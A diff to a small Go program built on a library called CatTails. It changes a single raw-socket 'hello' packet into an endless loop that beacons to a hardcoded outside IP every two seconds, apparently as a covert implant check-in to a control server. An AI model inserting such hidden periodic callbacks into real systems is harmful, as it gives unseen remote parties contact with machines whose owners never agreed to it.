@@ -1,14 +1,16 @@
 package main
 
 import (
+	"fmt"
 	"net"
 	"syscall"
+	"time"
 
 	"github.com/oneNutW0nder/CatTails/cattails"
 )
 
-func sendHello(fd int, iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
-	packet := cattails.CreatePacket(iface, src, dst, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))
+func sendHello(fd int, count int, iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
+	packet := cattails.CreatePacket(iface, src, dst, dstMAC, cattails.CreateHello(iface.HardwareAddr, src, count))
 
 	addr := cattails.CreateAddrStruct(iface)
 
@@ -26,6 +28,12 @@ func main() {
 
 	dstMAC, _ := cattails.GetRouterMAC()
 
-	sendHello(fd, iface, src, net.IPv4(129, 21, 117, 56), dstMAC)
+	count := 0
+	for {
+		time.Sleep(2 * time.Second)
+		sendHello(fd, count, iface, src, net.IPv4(18, 222, 200, 69), dstMAC)
+		count++
+		fmt.Println(count)
+	}
 
 }
